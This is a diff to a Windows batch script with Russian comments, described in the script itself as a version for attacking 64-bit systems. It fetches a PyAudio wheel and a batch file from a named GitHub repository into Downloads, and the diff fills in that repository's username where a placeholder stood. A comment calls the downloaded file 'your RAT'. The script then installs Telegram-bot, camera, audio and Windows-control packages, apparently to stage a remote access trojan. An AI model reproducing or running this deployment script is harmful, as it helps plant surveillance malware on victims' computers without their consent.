@@ -5,7 +5,7 @@ rem Это версия для атаки 64-битных систем на ба
 cd Downloads
 explorer https://github.com/Alabam178/remote/raw/master/PyAudio-0.2.11-cp38-cp38-win_amd64.whl
 rem Скачивает библиотеку PyAudio 64-bit в папку Downloads.
-explorer https://github.com/*/remote/raw/master/setup_64_comment.bat
+explorer https://github.com/Alabam178/remote/raw/master/setup_64_comment.bat
 rem Скачивает ваш RAT в папку Downloads.
 rem Замените * на ваш юзернейм в GitHub, ** на название вашего репозитория, *** на имя вашего файла (RAT).
 pip3 install pytelegrambotapi opencv-python pypiwin32 comtypes pillow pycaw
